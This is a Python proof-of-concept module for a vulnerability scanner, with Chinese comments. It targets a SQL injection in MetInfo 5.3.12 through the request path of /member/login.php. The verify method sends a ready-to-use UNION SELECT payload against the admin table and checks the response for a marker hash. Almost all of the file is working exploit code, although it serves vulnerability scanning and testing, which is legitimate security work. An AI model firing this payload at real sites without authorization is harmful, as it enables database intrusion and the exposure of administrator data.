# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MetInfo_0025'  # 平台漏洞编号，留空
    name = 'MetInfo 5.3.12 注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-12-22'  # 漏洞公布时间
    desc = '''
        漏洞出现在 \app\system\include\compatible\metv5_top.php
        $_SERVER[‘SCRIPT_NAME’] 去获取网站路径，但是这里有一个问题就是，路径中并没有waf 处理，可以导致一些安全问题，
        代码里面就直接 explode 函数对路径进行了切割，这里取出了倒数第二个参数，并且未经过处理就带入了 sql 语句，最终造成注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/4193/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MetInfo'  # 漏洞应用名称
    product_version = '5.3.12'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3f0f7cd5-9b9c-451e-8ac4-6c167ab18269'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/member/login.php/aa'UNION SELECT (select concat(admin_id,0x23,md5(c)) from met_admin_table limit 1),2,3,4,5,6,1111,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%23/aa"
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
